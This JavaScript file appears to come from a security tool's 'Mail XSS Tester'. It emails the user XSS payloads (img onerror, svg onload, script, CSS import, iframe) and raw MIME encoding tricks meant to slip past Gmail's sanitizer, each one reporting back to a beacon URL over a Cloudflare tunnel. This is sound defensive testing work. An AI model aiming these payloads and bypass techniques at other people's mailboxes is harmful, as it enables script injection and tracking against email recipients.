(function () {
  // Mail XSS Tester: send yourself an email containing several HTML/XSS
  // payload variants, each proving execution by firing a request to a
  // unique beacon URL - a sanitized/stripped payload never runs, so it
  // never calls out. Every payload's ONLY effect is that beacon request
  // (no exfiltration, no persistence) - this is a sanitization diagnostic
  // for your OWN mailbox, not an attack tool. See src-tauri/src/main.rs's
  // own "Mail XSS Tester" comment block for the Rust side (beacon HTTP
  // listener + tunnel process + SMTP send).
  //
  // Detection needs a PUBLICLY reachable beacon endpoint - webmail
  // providers (Gmail in particular) fetch/proxy embedded images through
  // their own infrastructure, not from the recipient's machine, so a
  // plain localhost listener could never receive the hit. Cloudflare's
  // free, account-free Quick Tunnel bridges that - see startTunnel().

  // Which payloads/techniques are checked and which categories are
  // collapsed - persisted to localStorage (same always-on treatment as
  // mail-verification-runtime.js's verifiedEmails) so re-opening the app
  // doesn't silently reset a picker you'd already set up. Credentials
  // (gmailAddress/appPassword/provider) deliberately stay OUT of this -
  // those keep the RAM-only, never-persisted discipline described below.
  var SELECTION_STORAGE_KEY = "netrecon_mail_xss_tester_selection_v1";

  function loadPersistedSelection() {
    try {
      var raw = window.localStorage ? window.localStorage.getItem(SELECTION_STORAGE_KEY) : "";
      if (!raw) return null;
      var parsed = JSON.parse(raw);
      return parsed && typeof parsed === "object" ? parsed : null;
    } catch (_) {
      return null;
    }
  }

  function savePersistedSelection(data) {
    try {
      if (window.localStorage) window.localStorage.setItem(SELECTION_STORAGE_KEY, JSON.stringify(data));
    } catch (_) {
      // ignore persistence failures
    }
  }

  // SMTP relay providers the send form can pick between - Gmail (the
  // original, only option) and Onet, added so a technique message genuinely
  // crosses TWO real mail systems (our tool -> real Onet SMTP -> internet ->
  // Gmail) instead of only ever originating from our own tool, in case a
  // provider's own relay/rewrite step matters for a technique that a direct
  // send never exercises. Onet's own published settings use the same
  // port-465-implicit-TLS scheme already used for Gmail, so no other Rust
  // change was needed beyond parameterizing the hardcoded host string.
  var MAIL_PROVIDERS = [
    { id: "gmail", host: "smtp.gmail.com", labelKey: "mailXssProviderGmail" },
    { id: "onet", host: "smtp.poczta.onet.pl", labelKey: "mailXssProviderOnet" },
  ];

  var PAYLOADS = [
    { id: "img-onerror", labelKey: "mailXssPayloadImgOnerror", category: "event-handlers" },
    { id: "svg-onload", labelKey: "mailXssPayloadSvgOnload", category: "svg" },
    { id: "svg-script", labelKey: "mailXssPayloadSvgScript", category: "svg" },
    { id: "css-import", labelKey: "mailXssPayloadCssImport", category: "css" },
    { id: "iframe-src", labelKey: "mailXssPayloadIframeSrc", category: "embed" },
    { id: "foreignobject", labelKey: "mailXssPayloadForeignObject", category: "svg" },
  ];

  // Grouping/UI metadata only - getPayloads() below stays exactly what it
  // was (flat, real payloads only, unchanged shape) since that's what
  // actually gets sent/selected. Category order here is the display order
  // in the LS panel (panel-content-runtime.js's renderMailXssTesterLibrary).
  var PAYLOAD_CATEGORIES = [
    { id: "event-handlers", labelKey: "mailXssCategoryEventHandlers" },
    { id: "svg", labelKey: "mailXssCategorySvg" },
    { id: "css", labelKey: "mailXssCategoryCss" },
    { id: "embed", labelKey: "mailXssCategoryEmbed" },
    { id: "mxss", labelKey: "mailXssCategoryMxss" },
    { id: "encoding", labelKey: "mailXssCategoryEncoding" },
    { id: "mime", labelKey: "mailXssCategoryMime" },
    { id: "amp", labelKey: "mailXssCategoryAmp" },
    { id: "smtp-headers", labelKey: "mailXssCategorySmtpHeaders" },
  ];

  // Not implemented yet - shown as disabled/grayed-out checkboxes in their
  // category so the planned coverage is visible, but nothing here is a real
  // payload: no id, never sent, never selectable. mutation XSS and AMP4Email
  // are still on this list; encoding/mime/smtp-headers moved to
  // RAW_TECHNIQUES below once they became real (a pentester's follow-up tip
  // after the first real finding: stop throwing known payloads at Gmail,
  // look at the SMTP/MIME <-> HTML parsing boundary instead).
  var PLACEHOLDER_PAYLOADS = [
    { category: "event-handlers", labelKey: "mailXssPlaceholderRareEventHandlers" },
    { category: "embed", labelKey: "mailXssPlaceholderIframeSrcdoc" },
    { category: "mxss", labelKey: "mailXssPlaceholderMxss" },
    { category: "amp", labelKey: "mailXssPlaceholderAmp" },
  ];

  // Raw-MIME encoding techniques - unlike PAYLOADS above, each of these
  // needs its OWN wholly separate email (a custom charset, a hand-picked
  // MIME boundary, invalid UTF-8 bytes - none of that can share a message
  // with the others or with a normal UTF-8 HTML body), built byte-for-byte
  // in Rust (see main.rs's build_technique_message and its 4 builders) and
  // sent via send_encoding_test_email's send_raw() escape hatch rather than
  // through the plain send_test_email/buildPayloadHtml path above.
  var RAW_TECHNIQUES = [
    { id: "utf7-charset", labelKey: "mailXssTechniqueUtf7Charset", category: "encoding" },
    { id: "overlong-utf8", labelKey: "mailXssTechniqueOverlongUtf8", category: "encoding" },
    // A second pentester tip after the MIME-boundary dead end: look at how
    // Gmail's preview handles Polish characters and long-line wrapping -
    // quoted-printable (the MIME transfer encoding that carries non-ASCII
    // text like Polish diacritics) has its own "soft line break" mechanic
    // (a trailing '=' + CRLF that's REMOVED on decode, rejoining split
    // content) worth exactly the same parser-differential treatment the
    // MIME boundary got. See main.rs's build_qp_soft_break_message/
    // build_qp_hex_escaped_tags_message.
    { id: "qp-soft-break", labelKey: "mailXssTechniqueQpSoftBreak", category: "encoding" },
    { id: "qp-hex-escaped-tags", labelKey: "mailXssTechniqueQpHexEscapedTags", category: "encoding" },
    // qp-soft-break above hand-places ONE break at a byte offset WE chose,
    // proving the decode-time-rejoin mechanic exists at all - these 10
    // variants instead let a REAL RFC 2045 76-column-limit encoder
    // (main.rs's quoted_printable_encode_folded, not the hand-placed one)
    // decide where its own soft break falls, by varying how much Polish
    // filler text precedes <script> across variants (main.rs's
    // qp_natural_wrap_variant_text) - sweeping the phase of that boundary
    // relative to the word "script" without us ever choosing the split
    // point ourselves. Each is its own separate technique id/checkbox
    // (not one combined "send 10 emails" button) so a hit's beacon path
    // ("<sessionToken>-qp-natural-wrap-N") pinpoints exactly which offset,
    // if any, actually landed a break inside the tag - same diagnostic
    // granularity as every other technique here.
    { id: "qp-natural-wrap-1", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#1)", category: "encoding" },
    { id: "qp-natural-wrap-2", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#2)", category: "encoding" },
    { id: "qp-natural-wrap-3", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#3)", category: "encoding" },
    { id: "qp-natural-wrap-4", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#4)", category: "encoding" },
    { id: "qp-natural-wrap-5", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#5)", category: "encoding" },
    { id: "qp-natural-wrap-6", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#6)", category: "encoding" },
    { id: "qp-natural-wrap-7", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#7)", category: "encoding" },
    { id: "qp-natural-wrap-8", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#8)", category: "encoding" },
    { id: "qp-natural-wrap-9", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#9)", category: "encoding" },
    { id: "qp-natural-wrap-10", labelKey: "mailXssTechniqueQpNaturalWrap", labelSuffix: " (#10)", category: "encoding" },
    { id: "mime-boundary-desync", labelKey: "mailXssTechniqueMimeBoundaryDesync", category: "mime" },
    // Same structural MIME confusion, smuggling <style>@import> instead of
    // <img> - added after the plain <img> variant confirmed real against
    // Gmail but only reached Google's own GoogleImageProxy (ggpht.com), not
    // the recipient's browser directly. External CSS isn't necessarily
    // covered by that same image-proxy layer, so this tests whether the
    // identical desync reaches the recipient unproxied instead.
    { id: "mime-boundary-desync-css", labelKey: "mailXssTechniqueMimeBoundaryDesyncCss", category: "mime" },
    // Control pair for the two desync variants above - byte-for-byte the
    // same 3-part multipart/alternative shape, but every boundary line is
    // well-formed (main.rs's build_mime_alternative_control_message). If
    // these ALSO trigger, the malformed boundary was never doing anything -
    // it's just multipart/alternative's own "render the last part you
    // understand" rule (RFC 2046 §5.1.4), not a parser bug.
    { id: "mime-alternative-control-img", labelKey: "mailXssTechniqueMimeAlternativeControlImg", category: "mime" },
    { id: "mime-alternative-control-css", labelKey: "mailXssTechniqueMimeAlternativeControlCss", category: "mime" },
    { id: "encoded-word-header", labelKey: "mailXssTechniqueEncodedWordHeader", category: "smtp-headers" },
  ];

  // Every variant's payload is "fire a request to beaconUrl" via whichever
  // vector it demonstrates - if a webmail's sanitizer strips the
  // attribute/tag, the fetch/import never happens and the payload simply
  // never reports in, which IS the useful signal (nothing to "clean up"
  // either way, and nothing here does more than call out).
  function buildPayloadHtml(id, beaconUrl) {
    var ping = "fetch('" + beaconUrl + "').catch(function(){})";
    switch (id) {
      case "img-onerror":
        return '<img src="https://invalid.example/x.png" alt="" onerror="' + ping + '" />';
      case "svg-onload":
        return '<svg onload="' + ping + '"></svg>';
      case "svg-script":
        return "<svg><script>" + ping + "</script></svg>";
      case "css-import":
        return '<style>@import "' + beaconUrl + '";</style>';
      case "iframe-src":
        return '<iframe src="' + beaconUrl + '"></iframe>';
      case "foreignobject":
        return '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="' + ping + '"></body></foreignObject></svg>';
      default:
        return "";
    }
  }

  function randomToken(len) {
    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    var out = "";
    for (var i = 0; i < len; i++) out += chars.charAt(Math.floor(Math.random() * chars.length));
    return out;
  }

  function createMailXssTesterRuntime() {
    var persistedSelection = loadPersistedSelection();
    // Payload ids in persistedSelection are filtered against the CURRENT
    // PAYLOADS/RAW_TECHNIQUES lists (not blindly trusted) - a stored id
    // from a previous app version that no longer exists (a removed/renamed
    // payload) would otherwise silently persist as a phantom "selected"
    // entry forever, with no checkbox left to ever uncheck it from.
    var validPayloadIds = PAYLOADS.map(function (p) { return p.id; });
    var validTechniqueIds = RAW_TECHNIQUES.map(function (t) { return t.id; });
    var selectedIds = (persistedSelection && Array.isArray(persistedSelection.selectedPayloadIds))
      ? persistedSelection.selectedPayloadIds.filter(function (id) { return validPayloadIds.indexOf(id) !== -1; })
      : validPayloadIds.slice();
    var selectedTechniqueIds = (persistedSelection && Array.isArray(persistedSelection.selectedTechniqueIds))
      ? persistedSelection.selectedTechniqueIds.filter(function (id) { return validTechniqueIds.indexOf(id) !== -1; })
      : [];
    // null = no preference ever recorded (first-ever use) - the renderer
    // falls back to its own hasRealItems-based default per category in
    // that case. Once the user touches any category header, this becomes
    // a complete, explicit snapshot of every category's state (see
    // setCollapsedCategoryIds's own comment for why it's saved as a whole
    // array rather than one id at a time).
    var collapsedCategoryIds = (persistedSelection && Array.isArray(persistedSelection.collapsedCategoryIds))
      ? persistedSelection.collapsedCategoryIds.slice()
      : null;

    function persistSelection() {
      savePersistedSelection({
        selectedPayloadIds: selectedIds,
        selectedTechniqueIds: selectedTechniqueIds,
        collapsedCategoryIds: collapsedCategoryIds,
      });
    }

    var tunnelStatus = "idle"; // idle | starting | running | error
    var tunnelUrl = "";
    var tunnelError = "";
    var hits = [];
    var unlistenHits = null;
    // A fresh random token per tunnel session, prefixed onto every beacon
    // path (/hit/<sessionToken>-<payloadId>) - the payload id alone stays
    // human-readable in the results table, but the full path isn't
    // trivially guessable by anyone else who might stumble onto the
    // short-lived public tunnel URL during the test window.
    var sessionToken = "";

    // Draft copies of the Gmail address/app password fields, kept ONLY in
    // memory (never localStorage/session, same "read at use time, never
    // persisted" discipline as sendTestEmail() below) - purely so the LS
    // panel's fields survive switching to a different center tab and back.
    // That panel's markup is fully torn down and regenerated on every such
    // switch (see wireMailXssTesterLibrary in panel-interactions-runtime.js,
    // a plain uncontrolled-input render), which used to silently reset both
    // fields to empty; re-populating them from here on each fresh render
    // fixes that without persisting the app password anywhere durable.
    var draftGmailAddress = "";
    var draftAppPassword = "";
    var draftProvider = MAIL_PROVIDERS[0].id;

    function emitChanged() {
      try {
        document.dispatchEvent(new CustomEvent("newui:mail-xss-tester-changed", {
          detail: { tunnelStatus: tunnelStatus, tunnelUrl: tunnelUrl, tunnelError: tunnelError, hits: hits.slice() }
        }));
      } catch (_) {
        // ignore event dispatch failures
      }
    }

    function getPayloads() {
      return PAYLOADS.slice();
    }

    function getPayloadCategories() {
      return PAYLOAD_CATEGORIES.slice();
    }

    function getPlaceholderPayloads() {
      return PLACEHOLDER_PAYLOADS.slice();
    }

    function getSelectedPayloadIds() {
      return selectedIds.slice();
    }

    function setPayloadSelected(id, selected) {
      var idx = selectedIds.indexOf(id);
      if (selected && idx === -1) selectedIds.push(id);
      else if (!selected && idx !== -1) selectedIds.splice(idx, 1);
      persistSelection();
      emitChanged();
    }

    function getRawTechniques() {
      return RAW_TECHNIQUES.slice();
    }

    function getSelectedTechniqueIds() {
      return selectedTechniqueIds.slice();
    }

    // Deliberately starts empty (unlike selectedIds above, which defaults
    // to "everything") - these are exploratory, unproven techniques rather
    // than known-safe diagnostics, so sending one is always an explicit
    // opt-in rather than something that fires just by having the panel open.
    function setTechniqueSelected(id, selected) {
      var idx = selectedTechniqueIds.indexOf(id);
      if (selected && idx === -1) selectedTechniqueIds.push(id);
      else if (!selected && idx !== -1) selectedTechniqueIds.splice(idx, 1);
      persistSelection();
      emitChanged();
    }

    // null means "no preference recorded yet" (see the module-level
    // collapsedCategoryIds comment above) - returned as-is (not .slice()'d
    // to []) so callers can tell "nothing customized" apart from
    // "customized to nothing collapsed".
    function getCollapsedCategoryIds() {
      return collapsedCategoryIds === null ? null : collapsedCategoryIds.slice();
    }

    // Takes the FULL current set of collapsed category ids, not one id at
    // a time - called from panel-interactions-runtime.js right after any
    // category header toggle, reading every [data-mail-xss-category]
    // element's live class list at that moment. A whole-snapshot write
    // avoids ever having to represent "explicitly expanded" vs "never
    // touched, following the default" with the same "absent from the
    // list" value once any single category has been customized.
    function setCollapsedCategoryIds(ids) {
      collapsedCategoryIds = Array.isArray(ids) ? ids.slice() : [];
      persistSelection();
      // No emitChanged() - this only records what the generic .v1-section-
      // header click handler (bootstrap-runtime.js) already did to the
      // DOM; nothing needs to re-render because of it.
    }

    function getTunnelStatus() { return tunnelStatus; }
    function getTunnelUrl() { return tunnelUrl; }
    function getTunnelError() { return tunnelError; }
    function getHits() { return hits.slice(); }

    // Deliberately no emitChanged() here - these fire on every keystroke,
    // and re-rendering the whole panel per keystroke would fight the
    // caret/selection in the very field being typed into. The draft only
    // needs to be picked up on the panel's own next natural re-render.
    function getDraftGmailAddress() { return draftGmailAddress; }
    function setDraftGmailAddress(value) { draftGmailAddress = String(value || ""); }
    function getDraftAppPassword() { return draftAppPassword; }
    function setDraftAppPassword(value) { draftAppPassword = String(value || ""); }
    function getMailProviders() { return MAIL_PROVIDERS.slice(); }
    function getDraftProvider() { return draftProvider; }
    function setDraftProvider(value) {
      var match = MAIL_PROVIDERS.some(function (p) { return p.id === value; });
      draftProvider = match ? value : MAIL_PROVIDERS[0].id;
    }
    function getProviderHost(providerId) {
      var found = MAIL_PROVIDERS.filter(function (p) { return p.id === providerId; })[0];
      return found ? found.host : MAIL_PROVIDERS[0].host;
    }

    // Strips the per-session random prefix back off a hit's payload_id
    // (see the sessionToken comment above) so callers only ever deal in
    // plain payload ids, never the "<token>-<id>" wire format - kept here
    // rather than leaked into the renderer, since sessionToken is this
    // module's own private state.
    function getTriggeredPayloadIds() {
      var prefix = sessionToken + "-";
      var triggered = {};
      hits.forEach(function (h) {
        var pid = (h && h.payload_id) || "";
        if (pid.indexOf(prefix) === 0) triggered[pid.slice(prefix.length)] = true;
      });
      return Object.keys(triggered);
    }

    function ensureHitListener() {
      if (unlistenHits) return;
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform || typeof platform.listen !== "function") return;
      Promise.resolve(platform.listen("mail-xss-beacon-hit", function (hit) {
        if (!hit) return;
        hits.push(hit);
        emitChanged();
      })).then(function (unlistenFn) {
        unlistenHits = unlistenFn;
      });
    }

    function startTunnel() {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return;
      tunnelStatus = "starting";
      tunnelError = "";
      hits = [];
      sessionToken = randomToken(16);
      ensureHitListener();
      emitChanged();

      Promise.resolve(platform.invoke("start_beacon_server", {})).then(function (port) {
        return platform.invoke("start_tunnel", { method: "cloudflare", localPort: port });
      }).then(function (url) {
        tunnelUrl = url;
        tunnelStatus = "running";
        emitChanged();
      }).catch(function (err) {
        tunnelStatus = "error";
        tunnelError = (err && err.message) ? err.message : String(err);
        // The beacon listener may have started even if the tunnel step
        // failed (e.g. cloudflared missing) - stop it too, no orphaned
        // local listener left behind after a failed start.
        Promise.resolve(platform.invoke("stop_beacon_server", {})).catch(function () {});
        emitChanged();
      });
    }

    function stopTunnel() {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return;
      Promise.resolve(platform.invoke("stop_tunnel", {})).catch(function () {});
      Promise.resolve(platform.invoke("stop_beacon_server", {})).catch(function () {});
      tunnelStatus = "idle";
      tunnelUrl = "";
      tunnelError = "";
      emitChanged();
    }

    function buildEmailHtml() {
      var payloadsById = {};
      PAYLOADS.forEach(function (p) { payloadsById[p.id] = p; });
      return getSelectedPayloadIds().map(function (id) {
        var beaconUrl = tunnelUrl + "/hit/" + sessionToken + "-" + id;
        return "<p>" + id + "</p>" + buildPayloadHtml(id, beaconUrl);
      }).join("\n<hr/>\n");
    }

    // Credentials (gmailAddress doubles as the SMTP username, appPassword)
    // are read straight from opts at call time and forwarded directly to
    // the Rust command - never stored on this module or anywhere else,
    // same one-time, read-at-use-only discipline as the remote-install/RDP
    // password fields built earlier.
    function sendTestEmail(opts) {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return Promise.reject(new Error("platform unavailable"));
      if (tunnelStatus !== "running") return Promise.reject(new Error("tunnel not running"));
      return platform.invoke("send_test_email", {
        gmailAddress: opts.gmailAddress,
        appPassword: opts.appPassword,
        to: opts.to,
        subject: opts.subject,
        htmlBody: buildEmailHtml(),
        smtpHost: getProviderHost(opts.provider),
      });
    }

    // Each selected raw technique is its OWN separate email (see
    // RAW_TECHNIQUES's comment - none of these can share a message with
    // each other or with the normal payloads' combined body), sent one at a
    // time through the same SMTP credentials rather than in parallel, so a
    // slow/failing send doesn't race the next one on the same account.
    // Resolves with {sent, failed} instead of rejecting on the first error,
    // so one bad technique doesn't stop the rest from being tried.
    function sendEncodingTestEmails(opts) {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return Promise.reject(new Error("platform unavailable"));
      if (tunnelStatus !== "running") return Promise.reject(new Error("tunnel not running"));

      var ids = getSelectedTechniqueIds();
      var sent = [];
      var failed = [];

      return ids.reduce(function (chain, id) {
        return chain.then(function () {
          var beaconUrl = tunnelUrl + "/hit/" + sessionToken + "-" + id;
          return platform.invoke("send_encoding_test_email", {
            gmailAddress: opts.gmailAddress,
            appPassword: opts.appPassword,
            to: opts.to,
            subject: opts.subject + " [" + id + "]",
            beaconUrl: beaconUrl,
            technique: id,
            smtpHost: getProviderHost(opts.provider),
          }).then(function () {
            sent.push(id);
          }).catch(function (err) {
            failed.push({ id: id, message: (err && err.message) ? err.message : String(err) });
          });
        });
      }, Promise.resolve()).then(function () {
        return { sent: sent, failed: failed };
      });
    }

    return {
      getPayloads: getPayloads,
      getPayloadCategories: getPayloadCategories,
      getPlaceholderPayloads: getPlaceholderPayloads,
      getSelectedPayloadIds: getSelectedPayloadIds,
      setPayloadSelected: setPayloadSelected,
      getRawTechniques: getRawTechniques,
      getSelectedTechniqueIds: getSelectedTechniqueIds,
      setTechniqueSelected: setTechniqueSelected,
      getCollapsedCategoryIds: getCollapsedCategoryIds,
      setCollapsedCategoryIds: setCollapsedCategoryIds,
      getTunnelStatus: getTunnelStatus,
      getTunnelUrl: getTunnelUrl,
      getTunnelError: getTunnelError,
      getDraftGmailAddress: getDraftGmailAddress,
      setDraftGmailAddress: setDraftGmailAddress,
      getDraftAppPassword: getDraftAppPassword,
      setDraftAppPassword: setDraftAppPassword,
      getMailProviders: getMailProviders,
      getDraftProvider: getDraftProvider,
      setDraftProvider: setDraftProvider,
      getProviderHost: getProviderHost,
      startTunnel: startTunnel,
      stopTunnel: stopTunnel,
      getHits: getHits,
      getTriggeredPayloadIds: getTriggeredPayloadIds,
      sendTestEmail: sendTestEmail,
      sendEncodingTestEmails: sendEncodingTestEmails,
      // localStorage-only otherwise (persistSelection above), bundled into
      // the session file too per the same "carry it to another machine/
      // profile" treatment as domainVerification/mailVerification.
      getStateForSession: function () {
        return {
          selectedPayloadIds: selectedIds.slice(),
          selectedTechniqueIds: selectedTechniqueIds.slice(),
          collapsedCategoryIds: collapsedCategoryIds === null ? null : collapsedCategoryIds.slice(),
        };
      },
      restoreFromSession: function (data) {
        data = data || {};
        selectedIds = Array.isArray(data.selectedPayloadIds)
          ? data.selectedPayloadIds.filter(function (id) { return validPayloadIds.indexOf(id) !== -1; })
          : [];
        selectedTechniqueIds = Array.isArray(data.selectedTechniqueIds)
          ? data.selectedTechniqueIds.filter(function (id) { return validTechniqueIds.indexOf(id) !== -1; })
          : [];
        collapsedCategoryIds = Array.isArray(data.collapsedCategoryIds) ? data.collapsedCategoryIds.slice() : null;
        persistSelection();
        emitChanged();
      },
    };
  }

  window.NetReconNewUICore = window.NetReconNewUICore || {};
  window.NetReconNewUICore.mailXssTester = createMailXssTesterRuntime();
})();
